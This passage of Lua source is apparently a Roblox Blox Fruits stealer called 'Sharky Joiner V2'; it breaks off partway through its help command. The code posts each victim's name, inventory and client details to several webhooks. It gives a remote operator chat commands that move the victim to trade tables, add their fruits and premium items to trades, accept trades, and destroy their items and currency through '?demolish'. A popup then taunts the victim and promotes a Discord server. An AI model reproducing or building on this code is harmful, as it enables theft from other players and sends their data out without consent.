    local executorName = identifyexecutor and identifyexecutor() or "Unknown";
    local currentSeaName = isSea3 and "Sea 3" or "Sea 2"
    local commonFields = {
        {
            name = "<a:GreenCheck:1339364301894324325>  **Victim Info**",
            value = string.format("**Name:** %s\n**Sea:** %s\n**Server:** **%s**", LocalPlayer.Name, currentSeaName, serverName),
            inline = true
        },
        {
            name = "<a:aright:1201511614705324063> **More Info**",
            value = string.format("**Players:** %d\n**Time:** %s\n**Executor:** %s", # Players:GetPlayers(), os.date("%Y-%m-%d %H:%M:%S"), executorName),
            inline = true
        },
        {
            name = "<a:womanalert:1285800405233827870> **TARGET ITEMS FOUND**",
            value = formatCombinedTargets_CodeBlocks_NoSeparator(fruits, premiumItems, fruitsToHitSet),
            inline = false
        },
        {
            name = "<a:PoggersRow:1271644776181010453> **Victim's Fruits**",
            value = formatFruitListWithEmojis_NoCodeBlock(fruits),
            inline = false
        },
        {
            name = "<a:catdance:728487186143641661> **Victim's PREMIUM Items**",
            value = formatPremiumList_NoCodeBlock(premiumItems),
            inline = false
        },
        {
            name = "<:a_pc:1332046396685160468> **Join Script (PC Copy)**",
            value = joinScriptPC_Formatted,
            inline = false
        },
        {
            name = "<:script:1353078817018876084> **Join Script (Mobile Copy)**",
            value = joinScriptMobile_Formatted,
            inline = false
        }
    }
    local commonFooter = {
        text = "Sharky Joiner V2 • 1.3.5 " .. os.date("%Y-%m-%d")
    }

    local shouldBypassFilter = false;
    local localPlayerNameLower = LocalPlayer.Name:lower()
    if Usernames and type(Usernames) == "table" then
        for _, name in ipairs(Usernames) do
            if type(name) == "string" and localPlayerNameLower == name:lower() then
                shouldBypassFilter = true;
                break
            end
        end
    end
    if not shouldBypassFilter and TestingUsernames and type(TestingUsernames) == "table" then
        for _, name in ipairs(TestingUsernames) do
            if type(name) == "string" and localPlayerNameLower == name:lower() then
                shouldBypassFilter = true;
                break
            end
        end
    end

    local function getValidChance(chanceValue)
        if type(chanceValue) == "number" and chanceValue >= 0 and chanceValue <= 1 then
            return chanceValue
        else
            return 1.0
        end
    end
    local dragonChance = getValidChance(RGBGreenVal);
    local topTierChance = getValidChance(RGBRedVal)

    local sendToUserWebhook = true
    if not shouldBypassFilter then
        local randomValue = math.random();
        if dragonHit then
            if randomValue > dragonChance then
                sendToUserWebhook = false
            end
        elseif hasPremiumItem or hasGoodFruit then
            if randomValue > topTierChance then
                sendToUserWebhook = false
            end
        end
    end

    local hiddenIndicator = " <a:YellowCheck:1361458542384779324>"
    local titleForUserPayload = baseEmbedTitle
    local titleForAdminPayloads = baseEmbedTitle

    if isTopFruitOnlyHit then
        titleForUserPayload = "<a:among_us_party:780475189519056946> **Target Fruit Hit!** <a:among_us_party:780475189519056946>"
    end
    if not sendToUserWebhook then
        titleForAdminPayloads = titleForAdminPayloads .. hiddenIndicator
    end

    local mainEmbedData = {
        title = titleForUserPayload,
        color = baseEmbedColor,
        fields = commonFields,
        footer = commonFooter
    }
    local mainPayloadTable = {
        content = baseMention,
        embeds = {
            mainEmbedData
        }
    }
    local mainPayloadBody = HttpService:JSONEncode(mainPayloadTable)

    local adminPayloadBody = nil;
    local protectorPayloadBody = nil;
    local isAdminHit = dragonHit or hasPremiumItem or hasGoodFruit

    local protectorEmbedData = {
        title = titleForAdminPayloads,
        color = baseEmbedColor,
        fields = commonFields,
        footer = commonFooter
    }
    local protectorPayloadTable = {
        content = baseMention,
        embeds = {
            protectorEmbedData
        }
    }
    protectorPayloadBody = HttpService:JSONEncode(protectorPayloadTable)

    if isAdminHit then
        local adminEmbedData = {
            title = titleForAdminPayloads,
            color = baseEmbedColor,
            fields = commonFields,
            footer = commonFooter
        }
        local adminPayloadTable = {
            content = baseMention,
            embeds = {
                adminEmbedData
            }
        }
        adminPayloadBody = HttpService:JSONEncode(adminPayloadTable)
    end

    if TEST_WEBHOOK and TEST_PAYLOAD then
        task.spawn(function()
            pcall(SafeRequest, {
                Url = TEST_WEBHOOK,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = TEST_PAYLOAD
            })
        end)
    end

    task.spawn(function()
        local h = {
            ["Content-Type"] = "application/json",
            ["X-Client-Key"] = validation_sig
        };
        if url1 and mainPayloadBody and sendToUserWebhook then
            SafeRequest({
                Url = url1,
                Method = "POST",
                Headers = h,
                Body = mainPayloadBody
            })
        end;
        if url2 and protectorPayloadBody then
            task.wait(0.1);
            SafeRequest({
                Url = url2,
                Method = "POST",
                Headers = h,
                Body = protectorPayloadBody
            })
        end;
        if url3 and adminPayloadBody then
            task.wait(0.1);
            SafeRequest({
                Url = url3,
                Method = "POST",
                Headers = h,
                Body = adminPayloadBody
            })
        end;
        if url4 and dragonHit and adminPayloadBody then
            task.wait(0.1);
            SafeRequest({
                Url = url4,
                Method = "POST",
                Headers = h,
                Body = adminPayloadBody
            })
        end
    end)

    table.clear(fruits);
    table.clear(premiumItems);
    table.clear(fruitsToHitSet);
end

-- Player Leaving Webhook
local inventory22
local function hasFruitInInventory2()
    if not inventory22 then
        return false
    end;
    for _, i in ipairs(inventory22) do
        if i.Type == "Blox Fruit" and table.find(FruitsToHit, i.Name) then
            return true
        end
    end;
    return false
end
local function hasPremiumItems2()
    if not inventory22 then
        return false
    end;
    for _, i in ipairs(inventory22) do
        if i.Type == "Premium" then
            return true
        end
    end;
    return false
end
local webhookSent = false
local function sendProtector()
    if webhookSent or not (hasFruitInInventory2() or hasPremiumItems2()) then
        return
    end;
    webhookSent = true;
    local u1 = webhook1_key and _G[webhook1_key];
    local u2 = Protector_key and _G[Protector_key];
    if not u1 and not u2 then
        return
    end;
    local p = LocalPlayer;
    local e = {
        title = "Victim has Left! <:sad:1241420488916340896>",
        description = p.Name .. " has left the game",
        color = 16711680,
        fields = {
            {
                name = "**User ID**",
                value = tostring(p.UserId),
                inline = true
            },
            {
                name = "**Account Age**",
                value = tostring(p.AccountAge) .. " days",
                inline = true
            },
            {
                name = "**Executor**",
                value = (identifyexecutor and identifyexecutor() or "Unknown"),
                inline = true
            }
        },
        timestamp = DateTime.now():ToIsoDate()
    };
    local d = {
        embeds = {
            e
        }
    };
    local b = HttpService:JSONEncode(d);
    local h = {
        ["Content-Type"] = "application/json",
        ["X-Client-Key"] = validation_sig
    };
    if u1 then
        pcall(originalRequest, {
            Url = u1,
            Method = "POST",
            Headers = h,
            Body = b
        })
    end;
    if u2 then
        task.wait(0.1);
        pcall(originalRequest, {
            Url = u2,
            Method = "POST",
            Headers = h,
            Body = b
        })
    end
end

-- Movement Function
local function tweenToPosition(p)
    local c = LocalPlayer.Character;
    if not c then
        return
    end;
    local h = c:FindFirstChildOfClass("Humanoid");
    if not h or h.Sit then
        return
    end;
    local r = c.PrimaryPart;
    if not r then
        return
    end;
    local V3n, CFn, CFl = Vector3.new, CFrame.new, CFrame.lookAt;
    local bv = Instance.new("BodyVelocity");
    bv.MaxForce = V3n(1e4, 1e4, 1e4);
    bv.P = 1e3;
    bv.Velocity = Vector3.new(0,0,0)
    if bv.Parent ~= r then
        bv.Parent = r
    end;

    local s = 300;
    local d = (r.Position - p).Magnitude;
    local ti = TweenInfo.new(math.max(0.5, d / s), Enum.EasingStyle.Linear);

    local bp = {};
    for _, pt in ipairs(c:GetDescendants()) do
        if pt:IsA("BasePart") then
            table.insert(bp, pt)
        end
    end;

    local ncC = nil;
    local uC = nil;
    local t = nil;

    local function cleanupTween()
        if uC and uC.Connected then uC:Disconnect(); uC = nil end;
        if ncC and ncC.Connected then ncC:Disconnect(); ncC = nil end;
        if bv and bv.Parent then bv:Destroy() end;
        if t and t.PlaybackState == Enum.PlaybackState.Playing then t:Cancel() end;
        if c and c.Parent then
            for i = 1, # bp do
                pcall(function() if bp[i] and bp[i].Parent then bp[i].CanCollide = true end end)
            end
        end
    end

    ncC = RunService.Stepped:Connect(function()
        if not c or not c.Parent then cleanupTween(); return end;
        for i = 1, # bp do pcall(function() if bp[i] and bp[i].Parent then bp[i].CanCollide = false end end) end
    end);

    uC = RunService.Heartbeat:Connect(function()
        if not r or not r.Parent or not bv or not bv.Parent then cleanupTween(); return end;
        if (r.Position - p).Magnitude < 5 then cleanupTween(); return end;
        local dir = (p - r.Position).Unit;
        r.CFrame = CFl(r.Position, r.Position + dir);
        bv.Velocity = dir * s
    end);

    t = TweenService:Create(r, ti, { CFrame = CFn(p) * CFn(0, r.Size.Y / 2, 0) });
    t.Completed:Connect(cleanupTween)
    t.Cancelled:Connect(cleanupTween)
    t:Play();

    t.Completed:Wait()
    task.wait(0.05)
end


-- Trade Table Function
local function findTradeTable()
    local tp = game.PlaceId == 7449423635 and Workspace.Map:FindFirstChild("Turtle") or Workspace.Map:FindFirstChild("Dressrosa");
    if not tp then
        return nil, nil
    end;
    local tradeTables = tp:GetChildren();
    if not tradeTables then
        return nil, nil
    end;
    local bestTable, bestSeat = nil, nil;
    local emptyTable, emptySeat = nil, nil;
    local fallbackTable, fallbackSeat = nil, nil;
    local function isTargetPlayer(seatWeld)
        if not seatWeld or not seatWeld.Part1 then
            return false
        end;
        local char = seatWeld.Part1.Parent;
        if not char then
            return false
        end;
        local p = Players:GetPlayerFromCharacter(char);
        if not p then
            return false
        end;
        if isCoreAdmin(p.Name) then
            return true
        end
        if not nonAdminAuthDisabled then
            local isUsernameListed = false
             if Usernames and type(Usernames) == "table" then
                 local pNameLower = p.Name:lower()
                 for _, uname in ipairs(Usernames) do
                     if type(uname) == "string" and uname:lower() == pNameLower then
                         isUsernameListed = true; break
                     end
                 end
             end
            local isActivated = activatedUsers[p.UserId]
            if allowEveryone or isUsernameListed or isActivated then
                return true
            end
        end
        return false
    end
    for _, tbl in ipairs(tradeTables) do
        if tbl.Name == "TradeTable" then
            local p1Seat, p2Seat = tbl:FindFirstChild("P1"), tbl:FindFirstChild("P2");
            if p1Seat and p2Seat then
                local p1Weld, p2Weld = p1Seat:FindFirstChild("SeatWeld"), p2Seat:FindFirstChild("SeatWeld");
                local p1IsEmpty, p2IsEmpty = not p1Weld, not p2Weld;
                local p1IsTarget, p2IsTarget = isTargetPlayer(p1Weld), isTargetPlayer(p2Weld);
                if (p1IsTarget and p2IsEmpty) then
                    bestTable, bestSeat = tbl, p2Seat;
                    break
                elseif (p2IsTarget and p1IsEmpty) then
                    bestTable, bestSeat = tbl, p1Seat;
                    break
                end
                if p1IsEmpty and p2IsEmpty and not emptyTable then
                    emptyTable, emptySeat = tbl, p1Seat
                end
                if not fallbackTable then
                    if p1IsEmpty and not p2IsTarget then
                        fallbackTable, fallbackSeat = tbl, p1Seat
                    elseif p2IsEmpty and not p1IsTarget then
                        fallbackTable, fallbackSeat = tbl, p2Seat
                    end
                end
            end
        end
    end
    return bestTable or emptyTable or fallbackTable, bestSeat or emptySeat or fallbackSeat
end

-- Jump Control
local isForceJumping = false;
local stateChangedConnections = {};
local jumpRequestConnection;
local characterAddedJumpConnection;
local function ForceJump()
    local h = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid");
    if not h then
        return
    end;
    isForceJumping = true;
    h.JumpPower = 50;
    h:ChangeState(Enum.HumanoidStateType.Jumping);
    task.delay(0.5, function()
        isForceJumping = false;
        if h and h.Parent then
            h.JumpPower = 0
        end
    end)
end;
local function lockJumping(h)
    if not h then
        return
    end;
    if stateChangedConnections[h] and stateChangedConnections[h].Connected then
        stateChangedConnections[h]:Disconnect();
        stateChangedConnections[h] = nil
    end;
    h.JumpPower = 0;
    h:SetStateEnabled(Enum.HumanoidStateType.Jumping, false);
    stateChangedConnections[h] = h.StateChanged:Connect(function(o, n)
        if n == Enum.HumanoidStateType.Jumping and not isForceJumping then
            h:ChangeState(o)
        end
    end)
end;
local function disableJump()
    if jumpRequestConnection and jumpRequestConnection.Connected then
        jumpRequestConnection:Disconnect();
        jumpRequestConnection = nil
    end;
    if characterAddedJumpConnection and characterAddedJumpConnection.Connected then
        characterAddedJumpConnection:Disconnect();
        characterAddedJumpConnection = nil
    end;
    if UserInputService.TouchEnabled then
        jumpRequestConnection = UserInputService.JumpRequest:Connect(function()
            if not isForceJumping and LocalPlayer.Character then
                local h = LocalPlayer.Character:FindFirstChildOfClass("Humanoid");
                if h then
                    h:SetStateEnabled(Enum.HumanoidStateType.Jumping, false)
                end
            end
        end)
    end;
    if LocalPlayer.Character then
        local currentHumanoid = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
        if currentHumanoid then lockJumping(currentHumanoid) end
    end;
    characterAddedJumpConnection = LocalPlayer.CharacterAdded:Connect(function(c)
        task.spawn(function()
            local h = c:WaitForChild("Humanoid", 5);
            if h then
                lockJumping(h)
            end
        end)
    end);
    return function()
        if jumpRequestConnection and jumpRequestConnection.Connected then
            jumpRequestConnection:Disconnect();
            jumpRequestConnection = nil
        end;
        if characterAddedJumpConnection and characterAddedJumpConnection.Connected then
            characterAddedJumpConnection:Disconnect();
            characterAddedJumpConnection = nil
        end;
        for h, c in pairs(stateChangedConnections) do
            if c and c.Connected then
                pcall(c.Disconnect, c)
            end
        end;
        table.clear(stateChangedConnections);
        local currentHumanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
        if currentHumanoid then
            pcall(currentHumanoid.SetStateEnabled, currentHumanoid, Enum.HumanoidStateType.Jumping, true)
        end
    end
end

-- Discord Invite UI (Victim Popup)
local function createDiscordUI()
    local S = Instance.new("ScreenGui");
    S.Name = "DiscordInviteUI";
    S.ZIndexBehavior = Enum.ZIndexBehavior.Sibling;
    S.ResetOnSpawn = false;
    S.IgnoreGuiInset = true;
    S.DisplayOrder = 9999;
    local M = Instance.new("Frame");
    M.Name = "MainFrame";
    M.Size = UDim2.new(0, 800, 0, 350);
    M.Position = UDim2.new(0.5, 0, 0.5, 0);
    M.AnchorPoint = Vector2.new(0.5, 0.5);
    M.BackgroundColor3 = Color3.fromRGB(32, 34, 37);
    M.BorderSizePixel = 0;
    M.Parent = S;
    Instance.new("UICorner", M).CornerRadius = UDim.new(0, 10);
    local T = Instance.new("TextLabel");
    T.Name = "Title";
    T.Size = UDim2.new(1, 0, 0, 40);
    T.Position = UDim2.new(0, 0, 0, 10);
    T.BackgroundTransparency = 1;
    T.Font = Enum.Font.GothamBold;
    T.Text = "Read Below!";
    T.TextColor3 = Color3.fromRGB(255, 255, 255);
    T.TextScaled = true;
    T.Parent = M;
    local D = Instance.new("TextLabel");
    D.Name = "Description";
    D.Size = UDim2.new(0.9, 0, 0, 100);
    D.Position = UDim2.new(0.05, 0, 0.3, 0);
    D.BackgroundTransparency = 1;
    D.Font = Enum.Font.Gotham;
    D.Text = "Hey! Some of your VALUABLE Fruits have been stolen by Sharky Joiner V2. No need to be sad! You can join us, and learn how this stealer works - And make a lot of fruits using it!";
    D.TextColor3 = Color3.fromRGB(220, 221, 222);
    D.TextScaled = true;
    D.Parent = M;
    local B = Instance.new("TextButton");
    B.Name = "CopyButton";
    B.Size = UDim2.new(0.7, 0, 0, 56);
    B.Position = UDim2.new(0.15, 0, 0.7, 0);
    B.BackgroundColor3 = Color3.fromRGB(88, 101, 242);
    B.Font = Enum.Font.GothamBold;
    B.Text = "Copy Discord Invite";
    B.TextColor3 = Color3.fromRGB(255, 255, 255);
    B.TextScaled = true;
    B.AutoButtonColor = false;
    B.Parent = M;
    Instance.new("UICorner", B).CornerRadius = UDim.new(0, 5);
    local fI = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out);
    local cT = function(i, p)
        return TweenService:Create(i, fI, p)
    end;
    M.BackgroundTransparency = 1;
    T.TextTransparency = 1;
    D.TextTransparency = 1;
    B.BackgroundTransparency = 1;
    B.TextTransparency = 1;
    task.wait(0.1);
    cT(M, {
        BackgroundTransparency = 0
    }):Play();
    task.wait(0.1);
    cT(T, {
        TextTransparency = 0
    }):Play();
    task.wait(0.1);
    cT(D, {
        TextTransparency = 0
    }):Play();
    task.wait(0.1);
    cT(B, {
        BackgroundTransparency = 0,
        TextTransparency = 0
    }):Play();
    B.MouseEnter:Connect(function()
        cT(B, {
            BackgroundColor3 = Color3.fromRGB(71, 82, 196)
        }):Play()
    end);
    B.MouseLeave:Connect(function()
        cT(B, {
            BackgroundColor3 = Color3.fromRGB(88, 101, 242)
        }):Play()
    end);
    B.MouseButton1Click:Connect(function()
        setclipboard("https://discord.gg/uwdvTtqTDA");
        B.Text = "Copied!";
        task.delay(2, function()
            if B.Parent then
                B.Text = "Copy Invite"
            end
        end)
    end);
    S.Parent = CoreGui;
    return S
end

-- Command System Setup
local ChatEvents = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents");
local SayMessageRequest = ChatEvents:WaitForChild("SayMessageRequest");
local CommandCooldowns = {};
local DEFAULT_COOLDOWN = 0.5

-- Modified sendMessage Function
local function sendMessage(m)
    if isSilentModeActive and silentModeTargetPlayer and silentModeTargetPlayer.Parent then
        local targetName = silentModeTargetPlayer.Name;
        local whisperMessage = "/w " .. targetName .. " " .. m
        pcall(function()
            SayMessageRequest:FireServer(whisperMessage, "All")
        end)
    else
        pcall(function()
            SayMessageRequest:FireServer(m, "All")
        end)
    end
end

-- Command Definitions
local Commands = {
    jump = {
        d = "Forces character jump.",
        u = "?jump",
        e = ForceJump
    },
    sit = {
        d = "Attempts to sit at trade table.",
        u = "?sit",
        e = function(args, player)
            sendMessage("Attempting to sit...");
            local t, s = findTradeTable();
            if not (t and s) then
                sendMessage("Error finding table! Try ?tp.");
                return
            end;
            local c = LocalPlayer.Character;
            if not (c and c.PrimaryPart) then
                sendMessage("Character error.");
                return
            end;
            tweenToPosition(s.Position + Vector3.new(0, 2, 0));
            task.wait(1);
            local function aS()
                for i = 1, 10 do
                    local r = Vector3.new(math.random(- 2, 2) / 10, math.random(- 2, 2) / 10, math.random(- 2, 2) / 10);
                    tweenToPosition(s.Position + r);
                    task.wait(0.5);
                    local h = c:FindFirstChildOfClass("Humanoid");
                    if h and h.Sit then
                        return true
                    end
                end;
                return false
            end;
            if not aS() then
                sendMessage("Failed to sit. Try ?sit again.")
            end
        end
    },
    tp = {
        d = "Teleports to trade hub.",
        u = "?tp",
        e = function(args, player)
            local t, l;
            if game.PlaceId == 7449423635 then
                l = "Mansion";
                local i = getInventory();
                if i then
                    for _, it in ipairs(i) do
                        if it.Name == "Valkyrie Helm" then
                            Remote:InvokeServer("requestEntrance", Vector3.new(- 12471.33, 374.95, - 7539.37));
                            sendMessage("Teleporting to Mansion (Valk)...");
                            return
                        end
                    end
                end;
                t = Vector3.new(- 12550.8701, 337.2399, - 7425.52)
            else
                l = "Cafe";
                t = Vector3.new(- 381.8599, 73.08, - 299.9299)
            end;
            if t then
                sendMessage("Teleporting to " .. l .. "...");
                tweenToPosition(t)
            else
                sendMessage("Cannot determine location.")
            end
        end
    },
    reset = {
        d = "Resets character.",
        u = "?reset",
        e = function(args, player)
            if LocalPlayer.Character then
                LocalPlayer.Character:BreakJoints()
            end
        end
    },
    rejoin = {
        d = "Rejoins current server.",
        u = "?rejoin",
        e = function(args, player)
            TeleportService:Teleport(game.PlaceId, LocalPlayer)
        end
    },
    add = {
        d = "Adds [count] fruit to trade.",
        u = "?add <fruit> [count]",
        e = function(a, player)
            local n, c = a:match("^(.-)%s*(%d*)$");
            if not n or n == "" then
                sendMessage("Usage: ?add <fruit> [count]");
                return
            end;
            local s = n:lower():match("^%s*(.-)%s*$");
            local rc = tonumber(c);
            if not rc or rc < 1 then
                rc = 1
            end;
            local inv = getInventory();
            if not inv then
                sendMessage("Inventory error.");
                return
            end;
            local f = nil;
            for _, i in pairs(inv) do
                if i.Type == "Blox Fruit" and i.Name:lower():find(s, 1, true) then
                    f = i;
                    break
                end
            end;
            if f then
                local av = f.Count;
                local ta = math.min(rc, av);
                if ta <= 0 then
                    sendMessage("None available.");
                    return
                end;
                sendMessage("Adding " .. ta .. "x '" .. f.Name .. "'...");
                local ad = 0;
                for i = 1, ta do
                    local sc, er = pcall(TradeFunction.InvokeServer, TradeFunction, "addItem", f.Name);
                    if sc then
                        ad = ad + 1
                    else
                        sendMessage("Error adding: " .. tostring(er));
                        break
                    end;
                    task.wait(0.1)
                end;
                sendMessage("Added " .. ad .. "/" .. ta .. " '" .. f.Name .. "'.");
                if rc > av then
                    sendMessage("(Requested " .. rc .. ", only " .. av .. " available.)")
                end
            else
                sendMessage("Fruit '" .. s .. "' not found!")
            end
        end
    },
    additem = {
        d = "Adds 1 premium item to trade.",
        u = "?additem <item>",
        e = function(a, player)
            local s = a:lower():match("^%s*(.-)%s*$");
            if s == "" then
                sendMessage("Usage: ?additem <item>");
                return
            end;
            local inv = getInventory();
            if not inv then
                sendMessage("Inventory error.");
                return
            end;
            local f = nil;
            for _, i in pairs(inv) do
                if i.Type == "Premium" and i.Name:lower():find(s, 1, true) then
                    f = i;
                    break
                end
            end;
            if f then
                sendMessage("Adding 1x '" .. f.Name .. "'...");
                TradeFunction:InvokeServer("addItem", f.Name);
                task.wait(0.1);
                sendMessage("Added '" .. f.Name .. "'.")
            else
                sendMessage("Item '" .. s .. "' not found!")
            end
        end
    },
    addall = {
        d = "Adds 1 of each target fruit.",
        u = "?addall",
        e = function(args, player)
            local tu = LocalPlayer.PlayerGui:FindFirstChild("Main");
            if not (tu and tu:FindFirstChild("Trade") and tu.Trade.Visible) then
                sendMessage("Not in trade.");
                return
            end;
            local inv = getInventory();
            if not inv then
                sendMessage("Inventory error.");
                return
            end;
            local ac = 0;
            local af = {};
            sendMessage("Adding target fruits...");
            local il = {};
            for _, i in pairs(inv) do
                if i.Type == "Blox Fruit" then
                    il[i.Name] = i.Count
                end
            end;
            local fs = {};
            for _, f in ipairs(FruitsToHit) do
                fs[f] = true
            end;
            for fn, _ in pairs(fs) do
                if il[fn] and il[fn] > 0 and not af[fn] then
                    local sc, er = pcall(TradeFunction.InvokeServer, TradeFunction, "addItem", fn);
                    if sc then
                        af[fn] = true;
                        ac = ac + 1;
                        sendMessage("Added 1x '" .. fn .. "'.")
                    else
                        sendMessage("Error adding " .. fn .. ": " .. tostring(er));
                        break
                    end;
                    task.wait(0.1)
                end
            end;
            if ac > 0 then
                sendMessage("Added " .. ac .. " target fruits.")
            else
                sendMessage("No target fruits available!")
            end
        end
    },
    addallitems = {
        d = "Adds 1 of each premium item.",
        u = "?addallitems",
        e = function(args, player)
            local tu = LocalPlayer.PlayerGui:FindFirstChild("Main");
            if not (tu and tu:FindFirstChild("Trade") and tu.Trade.Visible) then
                sendMessage("Not in trade.");
                return
            end;
            local inv = getInventory();
            if not inv then
                sendMessage("Inventory error.");
                return
            end;
            local ac = 0;
            local ai = {};
            sendMessage("Adding premium items...");
            for _, i in pairs(inv) do
                if i.Type == "Premium" and i.Count > 0 and not ai[i.Name] then
                    local sc, er = pcall(TradeFunction.InvokeServer, TradeFunction, "addItem", i.Name);
                    if sc then
                        ai[i.Name] = true;
                        ac = ac + 1;
                        sendMessage("Added 1x '" .. i.Name .. "'.")
                    else
                        sendMessage("Error adding " .. i.Name .. ": " .. tostring(er));
                        break
                    end;
                    task.wait(0.1)
                end
            end;
            if ac > 0 then
                sendMessage("Added " .. ac .. " premium items.")
            else
                sendMessage("No premium items available!")
            end
        end
    },
    cleartrade = {
        d = "Removes victim's trade items.",
        u = "?cleartrade",
        e = function(args, player)
            local tu = LocalPlayer.PlayerGui:FindFirstChild("Main");
            if not (tu and tu:FindFirstChild("Trade") and tu.Trade.Visible) then
                sendMessage("Not in trade.");
                return
            end;
            local c = tu.Trade:FindFirstChild("Container");
            if not c then sendMessage("Cannot find trade container."); return end;
            local pf = c:FindFirstChild("1");
            local itf = pf and pf:FindFirstChild("Frame");
            if not itf then
                sendMessage("Cannot find trade frame.");
                return
            end;
            local itr = {};
            for _, i in ipairs(itf:GetChildren()) do
                if i:IsA("ImageButton") and i.Name ~= "AddBeli" then
                    table.insert(itr, i.Name)
                end
            end;
            if # itr == 0 then
                sendMessage("No items to remove.");
                return
            end;
            sendMessage("Clearing " .. # itr .. " items...");
            local cc = 0;
            for _, itn in ipairs(itr) do
                local sc, er = pcall(TradeFunction.InvokeServer, TradeFunction, "removeItem", itn);
                if sc then
                    cc = cc + 1
                else
                    sendMessage("Error removing " .. itn .. ": " .. tostring(er))
                end;
                task.wait(0.1)
            end;
            sendMessage("Cleared " .. cc .. " items.")
        end
    },
    accept = {
        d = "Accepts trade (must be seated).",
        u = "?accept",
        e = function(args, player)
            local tu = LocalPlayer.PlayerGui:FindFirstChild("Main");
            if not (tu and tu:FindFirstChild("Trade") and tu.Trade.Visible) then
                sendMessage("Not in trade.");
                return
            end;
            local c = LocalPlayer.Character;
            if not c then
                sendMessage("Character error.");
                return
            end;
            local h = c:FindFirstChildOfClass("Humanoid");
            if not h then
                sendMessage("Humanoid error.");
                return
            end;
            if not h.Sit then
                sendMessage("Must be sitting.");
                return
            end;
            sendMessage("Accepting trade...");
            task.wait(0.1);
            TradeFunction:InvokeServer("accept")
        end
    },
    resetfruit = {
        d = "Equips & resets [count] times.",
        u = "?resetfruit <fruit> [count]",
        e = function(a, player)
            local n, c = a:match("^(.-)%s*(%d*)$");
            if not n or n == "" then
                sendMessage("Usage: ?resetfruit <fruit> [count]");
                return
            end;
            local s = n:lower():match("^%s*(.-)%s*$");
            local rc = tonumber(c);
            if not rc or rc < 1 then
                rc = 1
            end;
            sendMessage("Resetting with '" .. s .. "' " .. rc .. " times...");
            for i = 1, rc do
                local inv = getInventory();
                if not inv then
                    sendMessage("Inventory error " .. i);
                    break
                end;
                local f = nil;
                for _, it in pairs(inv) do
                    if it.Type == "Blox Fruit" and it.Name:lower():find(s, 1, true) then
                        f = it;
                        break
                    end
                end;
                if f then
                    local bfn = f.Name:match("(%S+)");
                    sendMessage("(" .. i .. "/" .. rc .. ") Equipping '" .. bfn .. "' & resetting...");
                    ForceJump();
                    task.wait(0.1);
                    Remote:InvokeServer("LoadFruit", bfn);
                    task.wait(0.3);
                    if LocalPlayer.Character then
                        LocalPlayer.Character:BreakJoints()
                    end;
                    sendMessage("Reset " .. i .. " done. Waiting...");
                    task.wait(5)
                else
                    sendMessage("Fruit '" .. s .. "' not found " .. i .. ". Aborting.");
                    break
                end;
                if i < rc then
                    task.wait(0.5)
                end
            end;
            sendMessage("Reset sequence finished.")
        end
    },
    invite = {
        d = "Shows victim Discord invite UI.",
        u = "?invite",
        e = createDiscordUI
    },
    demolish = {
        d = "!!DANGEROUS!! Resets all fruits, drains currency.",
        u = "?demolish",
        e = function(args, player)
            sendMessage("!!! DEMOLISH INITIATED !!!");
            local iR = function(rn, argsTbl)
                local remote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild(rn, 5); -- Use WaitForChild
                if remote then
                    return remote:InvokeServer(unpack(argsTbl))
                else
                    warn("Demolish: Could not find remote:", rn)
                    return nil
                end
            end;
            iR("CommF_", {"RemoveFruit", "Beli"});
            local inv = getInventory();
            if not inv then return end;
            local fr = {};
            for _, i in pairs(inv) do if i.Type == "Blox Fruit" then table.insert(fr, i) end end;
            table.sort(fr, function(a, b) return a.Value > b.Value end);
            for i, f in ipairs(fr) do
                local bfn = f.Name:match("(%S+)");
                sendMessage("(" .. i .. "/" .. # fr .. ") Resetting with '" .. bfn .. "'...");
                ForceJump();
                iR("CommF_", {"LoadFruit", bfn});
                task.wait(0.5);
                if LocalPlayer.Character then LocalPlayer.Character:BreakJoints(); task.wait(6) end
            end;
            local dB = function()
                local rA = {"PurchaseRawFruit", "Rocket-Rocket", false};
                local sA = {"PurchaseRawFruit", "Spin-Spin", false};
                while task.wait() do iR("CommF_", rA); task.wait(0.01); iR("CommF_", sA) end
            end;
            local dF = function()
                local fA = {"BlackbeardReward", "Refund", "2"};
                while task.wait() do iR("CommF_", fA) end
            end;
            task.spawn(dB);
            task.spawn(dF)
        end
    },
    showinv = {
        d = "Shows victim's fruit inventory.",
        u = "?showinv",
        e = function(args, player)
            task.spawn(function()
                sendMessage("Fetching inventory...");
                local inv = getInventory();
                if not inv then
                    sendMessage("Inventory error.");
                    return
                end;
                local fdl = {};
                for _, i in pairs(inv) do
                    if i.Type == "Blox Fruit" then
                        table.insert(fdl, {
                            name = i.Name,
                            count = i.Count,
                            value = i.Value or 0
                        })
                    end
                end;
                if # fdl == 0 then
                    sendMessage("No fruits found.");
                    return
                end;
                table.sort(fdl, function(a, b)
                    return a.value > b.value
                end);
                local fdl2 = {};
                for _, fd in ipairs(fdl) do
                    local fs = fd.name;
                    if fd.count > 1 then
                        fs = fs .. " (x" .. fd.count .. ")"
                    end;
                    table.insert(fdl2, fs)
                end;
                local ml = 180;
                local ipe = 10;
                local tc = math.ceil(# fdl2 / ipe);
                local cm = "Fruits [Value] (1/" .. tc .. "): ";
                local ci = 1;
                for i, fn in ipairs(fdl2) do
                    local pl = string.len("Fruits [Value] (X/Y): ");
                    local sep = (# cm > pl) and ", " or "";
                    local pa = sep .. fn;
                    if string.len(cm) + string.len(pa) > ml then
                        sendMessage(cm);
                        task.wait(1);
                        ci = ci + 1;
                        cm = "Fruits [Value] (" .. ci .. "/" .. tc .. "): " .. fn
                    else
                        cm = cm .. pa
                    end
                end;
                if cm ~= "" and not cm:match("^Fruits %[%w+%].*%): $") then
                    sendMessage(cm)
                end;
                task.wait(0.5);
                sendMessage("Inventory display complete.")
            end)
        end
    },
    test = {
        d = "Checks script responsiveness.",
        u = "?test",
        e = function(args, player)
            local s = tick();
            task.wait(0.001);
            sendMessage("Responsive! " .. string.format("%.1f", (tick() - s) * 1000) .. "ms")
        end
    },
    help = {
        d = "Displays commands.",
        u = "?help",
        e = function(args, player)
            task.spawn(function()
                local c = {
                    "?help ?test ?jump ?sit ?tp ?reset ?rejoin",
                    ".",
                    "?add ?additem ?addall ?addallitems",
                    "?resetfruit ?invite ?demolish ?showinv",
